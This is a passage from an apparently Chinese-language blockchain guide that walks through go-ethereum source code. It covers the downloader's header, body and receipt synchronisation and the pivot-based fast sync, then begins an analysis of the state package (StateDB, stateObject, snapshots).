errCanceled\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t//完成Pivot操作（或不进行快速同步），并且没有头文件，终止该过程\n\t\t\t\tp.log.Debug(&quot;No more headers available&quot;)\n\t\t\t\tselect {\n\t\t\t\tcase d.headerProcCh &lt;- nil:\n\t\t\t\t\treturn nil\n\t\t\t\tcase &lt;-d.cancelCh:\n\t\t\t\t\treturn errCanceled\n\t\t\t\t}\n\t\t\t}\n2.4 当header有数据并且是在获取skeleton的时候，调用fillHeaderSkeleton填充skeleton\nif skeleton {\n\t\t\t\tfilled, proced, err := d.fillHeaderSkeleton(from, headers)\n\t\t\t\tif err != nil {\n\t\t\t\t\tp.log.Debug(&quot;Skeleton chain invalid&quot;, &quot;err&quot;, err)\n\t\t\t\t\treturn errInvalidChain\n\t\t\t\t}\n\t\t\t\theaders = filled[proced:]\n\t\t\t\tfrom += uint64(proced)\n\t\t\t}\n2.5 如果当前处理的不是 skeleton，表明区块同步得差不多了，处理尾部的一些区块\n判断本地的主链高度与新收到的 header 的最高高度的高度差是否在 reorgProtThreshold 以内，如果不是，就将高度最高的 reorgProtHeaderDelay 个 header 丢掉。\nif head+uint64(reorgProtThreshold) &lt; headers[n-1].Number.Uint64() {\n\t\t\t\t\t\tdelay := reorgProtHeaderDelay\n\t\t\t\t\t\tif delay &gt; n {\n\t\t\t\t\t\t\tdelay = n\n\t\t\t\t\t\t}\n\t\t\t\t\t\theaders = headers[:n-delay]\n\t\t\t\t\t}\n2.6 如果还有 header 未处理，发给 headerProcCh 进行处理，Downloader.processHeaders 会等待这个 channel 的消息并进行处理；\nif len(headers) &gt; 0 {\n\t\t\t\t...\n\t\t\t\tselect {\n\t\t\t\tcase d.headerProcCh &lt;- headers:\n\t\t\t\tcase &lt;-d.cancelCh:\n\t\t\t\t\treturn errCanceled\n\t\t\t\t}\n\t\t\t\tfrom += uint64(len(headers))\n  getHeaders(from)\n}\n2.7 如果没有发送标头，或者所有标头等待 fsHeaderContCheck 秒，再次调用 getHeaders 请求区块\np.log.Trace(&quot;All headers delayed, waiting&quot;)\n\t\t\t\tselect {\n\t\t\t\tcase &lt;-time.After(fsHeaderContCheck):\n\t\t\t\t\tgetHeaders(from)\n\t\t\t\t\tcontinue\n\t\t\t\tcase &lt;-d.cancelCh:\n\t\t\t\t\treturn errCanceled\n\t\t\t\t}\n这段代码后来才加上的，其 commit 的记录在这里，而 「pull request」 在这里。从 「pull request」 中作者的解释我们可以了解这段代码的逻辑和功能：这个修改主要是为了解决经常出现的 「invalid hash chain」 错误，出现这个错误的原因是因为在我们上一次从远程节点获取到一些区块并将它们加入到本地的主链的过程中，远程节点发生了 reorg 操作（参见这篇文章里关于「主链与侧链」的介绍 ）；当我们再次根据高度请求新的区块时，对方返回给我们的是它的新的主链上的区块，而我们没有这个链上的历史区块，因此在本地写入区块时就会返回 「invalid hash chain」 错误。\n要想发生 「reorg」 操作，就需要有新区块加入。在以太坊主网上，新产生一个区块的间隔是 10 秒到 20 秒左右。一般情况下，如果仅仅是区块数据，它的同步速度还是很快的，每次下载也有最大数量的限制。所以在新产生一个区块的这段时间里，足够同步完成一组区块数据而对方节点不会发生 「reorg」 操作。但是注意刚才说的「仅仅是区块数据」的同步较快，state 数据的同步就非常慢了。简单来说在完成同步之前可能会有多个 「pivot」 区块，这些区块的 state 数据会从网络上下载，这就大大拖慢了整个区块的同步速度，使得本地在同步一组区块的同时对方发生 「reorg」 操作的机率大大增加。\n作者认为这种情况下发生的 「reorg」 操作是由新产生的区块的竞争引起的，所以最新的几个区块是「不稳定的」，如果本次同步的区块数量较多（也就是我们同步时消耗的时间比较长）（在这里「本次同步的区数数量较多」的表现是新收到的区块的最高高度与本地数据库中的最高高度的差距大于 reorgProtThreshold），那么在同步时可以先避免同步最新区块，这就是 reorgProtThreshold 和 reorgProtHeaderDelay 这个变量的由来。\n至此，Downloader.fetchHeaders 方法就结束了，所有的区块头也就同步完成了。在上面我们提到填充skeleton的时候，是由fillHeaderSkeleton函数来完成，接下来就要细讲填充skeleton的细节。\n\nfillHeaderSkeleton\n首先我们知道以太坊在同步区块时，先确定要下载的区块的高度区间，然后将这个区间按 MaxHeaderFetch 切分成很多组，每一组的最后一个区块组成了 「skeleton」（最后一组不满 MaxHeaderFetch 个区块不算作一组）。不清楚的可以查看上面的图。\n①：将一批header检索任务添加到队列中，以填充skeleton。\n这个函数参照上面queue详解的分析\n\nfunc (q *queue) ScheduleSkeleton(from uint64, skeleton []*types.Header) {}\n\n②：调用fetchParts 获取headers数据\nfetchParts是很核心的函数，下面的Fetchbodies和FetchReceipts都会调用。先来大致看一下fetchParts的结构：\nfunc (d *Downloader) fetchParts(...) error {\n  ...\n  for {\n\t\tselect {\n\t\tcase &lt;-d.cancelCh:\n\t\tcase packet := &lt;-deliveryCh:\n\t\tcase cont := &lt;-wakeCh:\n\t\tcase &lt;-ticker.C:\n\t\tcase &lt;-update:\n\t\t...\n\t}\n}\n简化下来就是这 5 个channel在处理，前面 4 个channel负责循环等待消息，update用来等待其他 4 个channel的通知来处理逻辑，先分开分析一个个的channel。\n2.1 deliveryCh 传递下载的数据\ndeliveryCh 作用就是传递下载的数据，当有数据被真正下载下来时，就会给这个 channel 发消息将数据传递过来。这个 channel 对应的分别是：d.headerCh、d.bodyCh、d.receiptCh，而这三个 channel 分别在以下三个方法中被写入数据：DeliverHeaders、DeliverBodies、DeliverReceipts。 看下deliveryCh如何处理数据：\ncase packet := &lt;-deliveryCh:\n\t\t\tif peer := d.peers.Peer(packet.PeerId()); peer != nil {\n\t\t\t\taccepted, err := deliver(packet)//传递接收到的数据块并检查链有效性\n\t\t\t\tif err == errInvalidChain {\n\t\t\t\t\treturn err\n        }\n\t\t\t\tif err != errStaleDelivery {\n\t\t\t\t\tsetIdle(peer, accepted)\n\t\t\t\t}\n\t\t\t\tswitch {\n\t\t\t\tcase err == nil &amp;&amp; packet.Items() == 0:\n\t\t\t\t\t...\n\t\t\t\tcase err == nil:\n\t\t\t\t...\n\t\t\t\t}\n\t\t\t}\n\t\t\tselect {\n\t\t\tcase update &lt;- struct{}{}:\n\t\t\tdefault:\n\t\t\t}\n收到下载数据后判断节点是否有效，如果节点没有被移除，则会通过deliver传递接收到的下载数据。如果没有任何错误，则通知update处理。\n要注意deliver是一个回调函数，它调用了 queue 对象的 Deliver 方法：queue.DeliverHeaders、queue.DeliverBodies、queue.DeliverReceipts，在收到下载数据就会调用此回调函数（queue相关函数分析参照queue详解部分）。\n在上面处理错误部分，有一个setIdle函数，它也是回调函数，其实现都是调用了 peerConnection 对象的相关方法：SetHeadersIdle、SetBodiesIdle、SetReceiptsIdle。它这个函数是指某些节点针对某类数据是空闲的，比如header、bodies、receipts，如果需要下载这几类数据，就可以从空闲的节点下载这些数据。\n2.2 wakeCh 唤醒fetchParts ，下载新数据或下载已完成\ncase cont := &lt;-wakeCh:\n\t\t\tif !cont {\n\t\t\t\tfinished = true\n\t\t\t}\n\t\t\tselect {\n\t\t\tcase update &lt;- struct{}{}:\n\t\t\tdefault:\n\t\t\t}\n首先我们通过调用fetchParts传递的参数知道，wakeCh 的值其实是 queue.headerContCh。在 queue.DeliverHeaders 中发现所有需要下戴的 header 都下载完成了时，才会发送 false 给这个 channel。fetchParts 在收到这个消息时，就知道没有 header 需要下载了。代码如下：\nfunc (q *queue) DeliverHeaders(......) (int, error) {\n    ......\n    if len(q.headerTaskPool) == 0 {\n        q.headerContCh &lt;- false\n    }\n    ......\n}\n同样如此，body和receipt则是bodyWakeCh和receiptWakeCh，在 processHeaders 中，如果所有 header 已经下载完成了，那么发送 false 给这两个 channel，通知它们没有新的 header 了。 body 和 receipt 的下载依赖于 header,需要 header 先下载完成才能下载，所以对于下戴 body 或 receipt 的 fetchParts 来说，收到这个 wakeCh 就代表不会再有通知让自己下载数据了.\nfunc (d *Downloader) processHeaders(origin uint64, pivot uint64, td *big.Int) error {\n    for {\n        select {\n        case headers := &lt;-d.headerProcCh:\n            if len(headers) == 0 {\n                for _, ch := range []chan bool{d.bodyWakeCh, d.receiptWakeCh} {\n                    select {\n                    case ch &lt;- false:\n                    case &lt;-d.cancelCh:\n                    }\n                }\n\t\t\t\t\t\t...\n            }\n            ...\n            for _, ch := range []chan bool{d.bodyWakeCh, d.receiptWakeCh} {\n                select {\n                case ch &lt;- true:\n                default:\n                }\n            }\n        }\n    }\n}\n2.3 ticker 负责周期性的激活 update进行消息处理\ncase &lt;-ticker.C:\n\t\t\tselect {\n\t\t\tcase update &lt;- struct{}{}:\n\t\t\tdefault:\n\t\t\t}\n \n2.4 update （处理此前几个channel的数据）(重要)\n2.4.1 判断是否有效节点，并获取超时数据的信息\n获取超时数据的节点ID和数据数量，如果大于两个的话，就将这个节点设置为空闲状态(setIdle)，小于两个的话直接断开节点连接。\nexpire 是一个回调函数，会返回当前所有的超时数据信息。这个函数的实际实现都是调用了 queue 对象的 Expire 方法：ExpireHeaders、ExpireBodies、ExpireReceipts,此函数会统计当前正在下载的数据中，起始时间与当前时间的差距超过给定阈值（downloader.requestTTL 方法的返回值）的数据，并将其返回。\nif d.peers.Len() == 0 {\n\t\t\t\treturn errNoPeers\n\t\t\t}\nfor pid, fails := range expire() {\n  if peer := d.peers.Peer(pid); peer != nil {\n    if fails &gt; 2 {\n\t\t\t\t\t\t...\n\t\t\t\t\t\tsetIdle(peer, 0)\n\t\t\t\t\t} else {\n\t\t\t\t\t...\n\t\t\t\t\t\tif d.dropPeer == nil {\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\td.dropPeer(pid)\n\t\t\t\t\t\t\t....\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n  }\n2.4.2 处理完超时数据，判断是否还有下载的数据\n如果没有其他可下载的内容，请等待或终止，这里pending()和inFlight()都是回调函数，pending分别对应了queue.PendingHeaders、queue.PendingBlocks、queue.PendingReceipts,用来返回各自要下载的任务数量。inFlight()分别对应了queue.InFlightHeaders、queue.InFlightBlocks、queue.InFlightReceipts,用来返回正在下载的数据数量。\nif pending() == 0 {\n\t\t\t\tif !inFlight() &amp;&amp; finished {\n\t\t\t\t...\n\t\t\t\t\treturn nil\n\t\t\t\t}\n\t\t\t\tbreak\n\t\t\t}\n2.4.3 使用空闲节点，调用fetch函数发送数据请求\nIdle()回调函数在上面已经提过了，throttle()回调函数则分别对queue.ShouldThrottleBlocks、queue.ShouldThrottleReceipts,用来表示是否应该下载bodies或者receipts。\nreserve函数分别对应queue.ReserveHeaders、queue.ReserveBodies、queue.ReserveReceipts,用来从从下载任务中选取一些可以下载的任务，并构造一个 fetchRequest 结构。它还返回一个 process 变量，标记着是否有空的数据正在被处理。比如有可能某区块中未包含任何一条交易，因此它的 body 和 receipt 都是空的，这种数据其实是不需要下载的。在 queue 对象的 Reserve 方法中，会对这种情况进行识别。如果遇到空的数据，这些数据会被直接标记为下载成功。在方法返回时，就将是否发生过「直接标记为下载成功」的情况返回。\ncapacity回调函数分别对应peerConnection.HeaderCapacity、peerConnection.BlockCapacity、peerConnection.ReceiptCapacity,用来决定下载需要请求数据的个数。\nfetch回调函数分别对应peer.FetchHeaders、peer.Fetchbodies、peer.FetchReceipts,用来发送获取各类数据的请求。\nprogressed, throttled, running := false, false, inFlight()\n\t\t\tidles, total := idle()\n\t\t\tfor _, peer := range idles {\n\t\t\t\tif throttle() {\n\t\t\t\t\t...\n        }\n\t\t\t\tif pending() == 0 {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\trequest, progress, err := reserve(peer, capacity(peer))\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn err\n\t\t\t\t}\n\t\t\t\tif progress {\n\t\t\t\t\tprogressed = true\n\t\t\t\t}\n        if request == nil {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tif request.From &gt; 0 {\n\t\t\t\t...\n\t\t\t\t}\n\t\t\t\t...\n\t\t\t\tif err := fetch(peer, request); err != nil {\n\t\t\t\t...\n\t\t\t}\n\t\t\tif !progressed &amp;&amp; !throttled &amp;&amp; !running &amp;&amp; len(idles) == total &amp;&amp; pending() &gt; 0 {\n\t\t\t\treturn errPeersUnavailable\n\t\t\t}\n简单来概括这段代码就是：使用空闲节点下载数据，判断是否需要暂停，或者数据是否已经下载完成；之后选取数据进行下载；最后，如果没有遇到空块需要下载、且没有暂停下载和所有有效节点都空闲和确实有数据需要下载，但下载没有运行起来，就返回 errPeersUnavailable 错误。\n到此为止fetchParts函数就分析的差不多了。里面涉及的跟queue.go相关的一些函数都在queue详解小节里介绍了。\n\nprocessHeaders\n通过headerProcCh接收header数据，并处理的过程是在processHeaders函数中完成的。整个处理过程集中在：case headers := &lt;-d.headerProcCh中:\n①：如果headers的长度为0 ，则会有以下操作：\n1.1 通知所有人header已经处理完毕\nfor _, ch := range []chan bool{d.bodyWakeCh, d.receiptWakeCh} {\n\t\t\t\t\tselect {\n\t\t\t\t\tcase ch &lt;- false:\n\t\t\t\t\tcase &lt;-d.cancelCh:\n\t\t\t\t\t}\n\t\t\t\t}\n1.2 若没有检索到任何header，说明他们的TD小于我们的，或者已经通过我们的fetcher模块进行了同步。\nif d.mode != LightSync {\n\t\t\t\t\thead := d.blockchain.CurrentBlock()\n\t\t\t\t\tif !gotHeaders &amp;&amp; td.Cmp(d.blockchain.GetTd(head.Hash(), head.NumberU64())) &gt; 0 {\n\t\t\t\t\t\treturn errStallingPeer\n\t\t\t\t\t}\n\t\t\t\t}\n1.3 如果是fast或者light 同步，确保传递了header\nif d.mode == FastSync || d.mode == LightSync {\n\t\t\t\t\thead := d.lightchain.CurrentHeader()\n\t\t\t\t\tif td.Cmp(d.lightchain.GetTd(head.Hash(), head.Number.Uint64())) &gt; 0 {\n\t\t\t\t\t\treturn errStallingPeer\n\t\t\t\t\t}\n\t\t\t\t}\n②：如果headers的长度大于 0\n2.1 如果是fast或者light 同步，调用**ightchain.InsertHeaderChain()**写入header到leveldb数据库；\nif d.mode == FastSync || d.mode == LightSync {\n  ....\n  d.lightchain.InsertHeaderChain(chunk, frequency);\n  ....\n}\n2.2 如果是fast或者full sync模式，则调用 d.queue.Schedule进行内容(body和receipt)检索。\nif d.mode == FullSync || d.mode == FastSync {\n  ...\n  inserts := d.queue.Schedule(chunk, origin)\n  ...\n}\n③：如果找到更新的块号，则要发信号通知新任务\nif d.syncStatsChainHeight &lt; origin {\n\t\t\t\td.syncStatsChainHeight = origin - 1\n\t\t\t}\nfor _, ch := range []chan bool{d.bodyWakeCh, d.receiptWakeCh} {\n\t\t\t\tselect {\n\t\t\t\tcase ch &lt;- true:\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t}\n到此处理Headers的分析就完成了。\n\n同步bodies\n同步bodies 则是由fetchBodies函数完成的。\nfetchBodies\n同步bodies的过程跟同步header类似，大致讲下步骤：\n\n调用fetchParts\nReserveBodies()从bodyTaskPool中取出要同步的body；\n调用fetch，也就是调用这里的FetchBodies从节点获取body，发送GetBlockBodiesMsg消息；\n收到bodyCh的数据后，调用deliver函数，将Transactions和Uncles写入resultCache。\n\n\n同步Receipts\nfetchReceipts\n同步receipts的过程跟同步header类似，大致讲下步骤：\n\n调用fetchParts()\nReserveBodies()从ReceiptTaskPool中取出要同步的Receipt\n调用这里的FetchReceipts从节点获取receipts，发送GetReceiptsMsg消息；\n收到receiptCh的数据后，调用deliver函数，将Receipts写入resultCache。\n\n\n同步状态\n这里我们讲两种模式下的状态同步：\n\nfullSync: processFullSyncContent，full模式下Receipts没有缓存到resultCache中，直接先从缓存中取出body数据，然后执行交易生成状态，最后写入区块链。\nfastSync:processFastSyncContent：fast模式的Receipts、Transaction、Uncles都在resultCache中，所以还需要下载”state”，进行校验，再写入区块链。\n\n接下来大致的讨论下这两种方式。\nprocessFullSyncContent\nfunc (d *Downloader) processFullSyncContent() error {\n\tfor {\n\t\tresults := d.queue.Results(true)\n\t\t...\n\t\tif err := d.importBlockResults(results); err != nil ...\n\t}\n}\nfunc (d *Downloader) importBlockResults(results []*fetchResult) error {\n\t...\n\tselect {\n...\n\tblocks := make([]*types.Block, len(results))\n\tfor i, result := range results {\n\t\tblocks[i] = types.NewBlockWithHeader(result.Header).WithBody(result.Transactions, result.Uncles)\n\t}\n\tif index, err := d.blockchain.InsertChain(blocks); err != nil {\n\t\t....\n}\n直接从result中获取数据并生成block，直接插入区块链中，就结束了。\n\nprocessFastSyncContent\nfast模式同步状态内容比较多，大致也就如下几部分，我们开始简单分析以下。\n①：下载最新的区块状态\nsync := d.syncState(latest.Root)\n我们直接用一张图来表示整个大致流程：\n\n具体的代码读者自己翻阅，大致就是这么个简单过程。\n②：计算出pivot块\npivot为latestHeight - 64，调用splitAroundPivot()方法以pivot为中心，将results分为三个部分：beforeP，P，afterP；\npivot := uint64(0)\n\tif height := latest.Number.Uint64(); height &gt; uint64(fsMinFullBlocks) {\n\t\tpivot = height - uint64(fsMinFullBlocks)\n\t}\nP, beforeP, afterP := splitAroundPivot(pivot, results)\n③： 对beforeP的部分调用commitFastSyncData，将body和receipt都写入区块链\nd.commitFastSyncData(beforeP, sync); \n④：对P的部分更新状态信息为P block的状态，把P对应的result（包含body和receipt）调用commitPivotBlock插入本地区块链中，并调用FastSyncCommitHead记录这个pivot的hash值，存在downloader中，标记为快速同步的最后一个区块hash值；\nif err := d.commitPivotBlock(P); err != nil {\n\t\t\t\t\treturn err\n\t\t\t\t}\n⑤：对afterP调用d.importBlockResults，将body插入区块链，而不插入receipt。因为是最后 64 个区块，所以此时数据库中只有header和body，没有receipt和状态，要通过fullSync模式进行最后的同步。\nif err := d.importBlockResults(afterP); err != nil {\n\t\t\treturn err\n\t\t}\n到此为止整个Downloader同步完成了。\n参考\n\nmindcarver.cn\ngithub.com/ethereum/go-ethereum/pull/1889\nyangzhe.me/2019/05/09/ethereum-downloader/#fetchparts\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之state-16":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之state-16","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之state-16.md","title":"死磕以太坊源码分析之state-16","links":[],"tags":[],"content":"\n死磕以太坊源码分析之state\n配合以下代码进行阅读：github.com/blockchainGuide/\n希望读者在阅读过程中发现问题可以及时评论哦，大家一起进步。\n\n源码目录\n｜-database.go 底层的存储设计\n｜-dump.go  用来dumpstateDB数据\n｜-iterator.go，用来遍历Trie\n｜-journal.go，用来记录状态的改变\n｜-state_object.go 通过state object操作账户值，并将修改后的storage trie写入数据库\n｜-statedb.go，以太坊整个的状态\n｜-sync.go，用来和downloader结合起来同步state\n\n基础概念\n状态机\n以太坊的本质就是一个基于交易的状态机(transaction-based state machine)。在计算机科学中，一个 状态机 是指可以读取一系列的输入，然后根据这些输入，会转换成一个新的状态出来的东西。\n我们从**创世纪状态(genesis state)**开始，在网络中还没有任何交易的时候产生状态。当第一个区块执行第一个交易时候开始产生状态，直到执行完N个交易，第一个区块的最终状态产生，第二个区块的第一笔交易执行后将会改变第一个区块链的最终状态，以此类推，从而产生最终的区块状态。\n\n以太坊状态数据库\n区块的状态数据并非保存在链上，而是将这些状态维护在默克尔压缩前缀树中，在区块链上仅记录对应的Trie Root 值。使用LevelDB维护树的持久化内容，而这个用来维护映射的数据库叫做 StateDB。\n首先我们用一张图来大致了解一下StateDB：\n\n可以看到图中一共有两种状态，一个是世界状态Trie,一个是storage Trie,两者都是MPT树，世界状态包含了一个个的账户状态，账户状态通过以账户地址为键，维护在表示世界状态的树中，而每个账户状态中存储这账户存储树的Root。账户状态存储一下信息：\n\nnonce: 表示此账户发出的交易数量\nbalance: 账户余额\nstorageRoot:  账户存储树的Root根，用来存储合约信息\ncodeHash: 账户的 EVM 代码哈希值，当这个地址接收到一个消息调用时，这些代码会被执行; 它和其它字段不同，创建后不可更改。如果 codeHash 为空，则说明该账户是一个简单的外部账户，只存在 nonce 和 balance。\n\n接下来将会分析State相关的一些类，着重关注statedb.go、state_object.go、database.go,其中涉及的Trie相关的代码可以参照：死磕以太坊源码分析之MPT树-下\n关键的数据结构\nAccount\nAccount存储的是账户状态信息。\ntype Account struct {\n\tNonce    uint64      //账户发出的交易数量\n\tBalance  *big.Int    // 账户的余额\n\tRoot     common.Hash //账户存储树的Root根，用来存储合约信息\n\tCodeHash []byte      // 账户的 EVM 代码哈希值\n}\nStateObject\n表示一个状态对象，可以从中获取到账户状态信息。\ntype stateObject struct {\n\taddress  common.Address\n\taddrHash common.Hash // 账户地址哈希\n\tdata     Account\n\tdb       *StateDB // 所属的StateDB\n\tdbErr error //VM不处理db层的错误，先记录下来，最后返回，只能保存1个错误，保存的第一个错误\n\t\n  // Write caches.\n\ttrie Trie // storage trie, 使用trie组织stateObj的数据\n\tcode Code // 合约字节码，在加载代码时设置\n \n\t//将原始条目的存储高速缓存存储到dedup重写中，为每个事务重置\n\toriginStorage Storage \n \n\t//在整个块的末尾需要刷新到磁盘的存储条目\n\tpendingStorage Storage \n \n\t//在当前事务执行中已修改的存储条目\n\tdirtyStorage Storage \n \nStateDB\n用来存储状态对象。\ntype StateDB struct {\n  db   Database\n\ttrie Trie // 当前所有账户组成的MPT树\n \n\t// 这几个相关账户状态修改\n\tstateObjects        map[common.Address]*stateObject // 存储缓存的账户状态信息\n\tstateObjectsPending map[common.Address]struct{}     // 状态对象已经完成但是还没有写入到Trie中\n\tstateObjectsDirty   map[common.Address]struct{}     // 在当前执行中修改的状态对象 ，用于后续commit \n}\n\n三者之间的关系：\nStateDB→Trie→Account→stateObject\n从StateDB中取出Trie根，根据地址从Trie树中获取账户的rlp编码数据，再进行解码成Account，然后根据Account生成stateObject\n\nStateDB存储状态\nStateDB读写状态主要关心以下几个文件：\n\ndatabase.go\nstate_object.go\nstatedb.go\n\n接下来分别介绍这么几个文件，相当关键。\ndatabase.go\n根据世界状态root打开世界状态树\n从StateDB中打开一个Trie大致经历以下过程：\n\nOpenTrie(root common.Hash)→NewSecure→New\n\n根据账户地址和 stoage root打开状态存储树\n创建一个账户的存储Trie过程如下：\n\nOpenStorageTrie(addrHash, root common.Hash)→NewSecure-New\n\nAccount和StateObject\n以太坊的账户分为普通账户和合约账户,以Account表示，Account是账户的数据，不包含账户地址，账户需要使用地址来表示，地址在stateObject中。\ntype Account struct {\n\tNonce    uint64\n\tBalance  *big.Int\n\tRoot     common.Hash // 存储树的merkle树根 账户状态\n\tCodeHash []byte //合约账户专属，合约代码编译后的Hash值\n}\ntype stateObject struct {\n  address  common.Address // 账户地址\n\taddrHash common.Hash // 账户地址哈希\n\tdata     Account\n\tdb       *StateDB // 所属的StateDB\n  dbErr error //VM不处理db层的错误，先记录下来，最后返回，只能保存1个错误，保存存的第一个错误\n\ttrie Trie // storage trie, 使用trie组织stateObj的数据\n\tcode Code // 合约字节码，在加载代码时设置\n\toriginStorage Storage //将原始条目的存储高速缓存存储到dedup重写中，为每个事务重置\n\tpendingStorage Storage //在整个块的末尾需要刷新到磁盘的存储条目\n\tdirtyStorage Storage //在当前事务执行中已修改的存储条目\n}\n创建StateObject\n创建状态对象会在两个地方进行调用：\n\n检索或者创建状态对象\n创建账户\n\n最终都会去调用createObject创建一个新的状态对象。如果有一个现有的帐户给定的地址，老的将被覆盖并作为第二个返回值返回\nfunc (s *StateDB) createObject(addr common.Address) (newobj, prev *stateObject) {\n\tprev = s.getDeletedStateObject(addr)// 如果存在老的，获取用来以后删除掉\n \n\tnewobj = newObject(s, addr, Account{})\n\tnewobj.setNonce(0) \n\tif prev == nil {\n\t\ts.journal.append(createObjectChange{account: &amp;addr})\n\t} else {\n\t\ts.journal.append(resetObjectChange{prev: prev})\n\t}\n\ts.setStateObject(newobj)\n\treturn newobj, prev\n}\nstate_object.go\nstate_object.go是很重要的文件，我们直接通过比较重要的函数来了解它。\n增加账户余额\nAddBalance-&gt;SetBalance\n将对象的存储树保存到db\n主要就做了两件事：\n\nupdateTrie将缓存的存储修改写入对象的存储Trie。\n将所有节点写入到trie的内存数据库中\n\nfunc (s *stateObject) CommitTrie(db Database) error {\n\ts.updateTrie(db)\n\t...\n\troot, err := s.trie.Commit(nil)\n\t...\n}\n第一件事会在下面继续讲，第二件事可以参照我之前关于 死磕以太坊源码分析之MPT树-下的讲解。\n①：将缓存的存储修改写入对象的存储Trie\n\n主要流程： 最终还是调用了trie.go的insert方法\nupdateTrie→TryUpdate→insert\n\n\ns.finalise() 将dirtyStorage中的所有数据移动到pendingStorage中\n根据账户哈希和账户root打开账户存储树\n将key与trie中的value关联，更新数据\n\nfunc (s *stateObject) updateTrie(db Database) Trie {\n\ts.finalise() ①\n...\n\t\n\ttr := s.getTrie(db) ②\n\tfor key, value := range s.pendingStorage {\n\t\t...\n\t\tif (value == common.Hash{}) {\n\t\t\ts.setError(tr.TryDelete(key[:]))\n\t\t\tcontinue\n\t\t}\n\t...\n\t\ts.setError(tr.TryUpdate(key[:], v)) ③\n\t}\n...\n}\n整个核心也就是updateTrie，调用了trie的insert方法进行处理。\n②：将所有节点写入到trie的内存数据库，其key以sha3哈希形式存储\n\n流程：\ntrie.Commit→t.trie.Commit→t.hashRoot\n\nfunc (t *SecureTrie) Commit(onleaf LeafCallback) (root common.Hash, err error) {\n\tif len(t.getSecKeyCache()) &gt; 0 {\n\t\tt.trie.db.lock.Lock()\n\t\tfor hk, key := range t.secKeyCache {\n\t\t\tt.trie.db.insertPreimage(common.BytesToHash([]byte(hk)), key)\n\t\t}\n\t\tt.trie.db.lock.Unlock()\n \n\t\tt.secKeyCache = make(map[string][]byte)\n\t}\n\treturn t.trie.Commit(onleaf)\n}\n如果KeyCache中已经有了，直接插入到磁盘数据库，否则的话插入到Trie的内存数据库。\n将trie根设置为的当前根哈希\nfunc (s *stateObject) updateRoot(db Database) {\n\ts.updateTrie(db)\n\tif metrics.EnabledExpensive {\n\t\tdefer func(start time.Time) { s.db.StorageHashes += time.Since(start) }(time.Now())\n\t}\n\ts.data.Root = s.trie.Hash()\n}\n方法也比较简单，底层调用UpdateTrie然后再更新root.\nState_object.go的核心方法也就这么些内容。\nstatedb.go\n创建账户\n创建账户的核心就是创建状态对象，然后再初始化值。\nfunc (s *StateDB) CreateAccount(addr common.Address) {\n\tnewObj, prev := s.createObject(addr)\n\tif prev != nil {\n\t\tnewObj.setBalance(prev.data.Balance)\n\t}\n}\nfunc (s *StateDB) createObject(addr common.Address) (newobj, prev *stateObject) {\n\tprev = s.getDeletedStateObject(addr) \n \n\tnewobj = newObject(s, addr, Account{})\n\tnewobj.setNonce(0) \n\tif prev == nil {\n\t\ts.journal.append(createObjectChange{account: &amp;addr})\n\t} else {\n\t\ts.journal.append(resetObjectChange{prev: prev})\n\t}\n\ts.setStateObject(newobj)\n\treturn newobj, prev\n}\n删除、更新、获取状态对象\nfunc (s *StateDB) deleteStateObject(obj *stateObject) \nfunc (s *StateDB) updateStateObject(obj *stateObject) \nfunc (s *StateDB) getStateObject(obj *stateObject) {\n这三个方法底层分别都是调用Trie.TryDelete、Trie.TryUpdate、Trie.TryGet方法来分别获取。\n这里大致的讲一下getStateObject，代码如下：\nfunc (s *StateDB) getDeletedStateObject(addr common.Address) *stateObject {\n\t// Prefer live objects if any is available\n\tif obj := s.stateObjects[addr]; obj != nil {\n\t\treturn obj\n\t}\n\t// Track the amount of time wasted on loading the object from the database\n\tif metrics.EnabledExpensive {\n\t\tdefer func(start time.Time) { s.AccountReads += time.Since(start) }(time.Now())\n\t}\n\t// Load the object from the database\n\tenc, err := s.trie.TryGet(addr[:])\n\tif len(enc) == 0 {\n\t\ts.setError(err)\n\t\treturn nil\n\t}\n\tvar data Account\n\tif err := rlp.DecodeBytes(enc, &amp;data); err != nil {\n\t\tlog.Error(&quot;Failed to decode state object&quot;, &quot;addr&quot;, addr, &quot;err&quot;, err)\n\t\treturn nil\n\t}\n\t// Insert into the live set\n\tobj := newObject(s, addr, data)\n\ts.setStateObject(obj)\n\treturn obj\n}\n大致就做了以下几件事：\n\n先从StateDB中获取stateObjects,有的话就返回。\n如果没有的话就从stateDB的trie中获取账户状态数据，获取到rlp编码的数据之后，将其解码。\n根据状态数据Account 构造stateObject\n\n余额操作\n余额的操作大致有添加、减少、和设定。我们就拿添加来分析：\n根据地址获取stateObject，然后addBalance.\nfunc (s *StateDB) AddBalance(addr common.Address, amount *big.Int) {\n\tstateObject := s.GetOrNewStateObject(addr)\n\tif stateObject != nil {\n\t\tstateObject.AddBalance(amount)\n\t}\n}\n储存快照和回退快照\nfunc (s *StateDB) Snapshot() int \nfunc (s *StateDB) RevertToSnapshot(revid int)\n储存快照和回退快照，我们可以在提交交易的流程中找到：\nfunc (w *worker) commitTransaction(tx *types.Transaction, coinbase common.Address) ([]*types.Log, error) {\n\tsnap := w.current.state.Snapshot()\n \n\treceipt, err := core.ApplyTransaction(w.chainConfig, w.chain, &amp;coinbase, w.current.gasPool, w.current.state, w.current.header, tx, &amp;w.current.header.GasUsed, *w.chain.GetVMConfig())\n\tif err != nil {\n\t\tw.current.state.RevertToSnapshot(snap)\n\t\treturn nil, err\n\t}\n\tw.current.txs = append(w.current.txs, tx)\n\tw.current.receipts = append(w.current.receipts, receipt)\n \n\treturn receipt.Logs, nil\n}\n首先我们会对当前状态进行快照，然后执行ApplyTransaction，如果在预执行交易的阶段出错了，那么会回退到备份的快照位置。之前的修改全部会回退。\n计算状态Trie的当前根哈希\n计算状态Trie的当前根哈希是由IntermediateRoot来完成的。\n①：确定所有的脏存储状态（简单理解就是当前执行修改的所有对象）\nfunc (s *StateDB) Finalise(deleteEmptyObjects bool) {\n\tfor addr := range s.journal.dirties 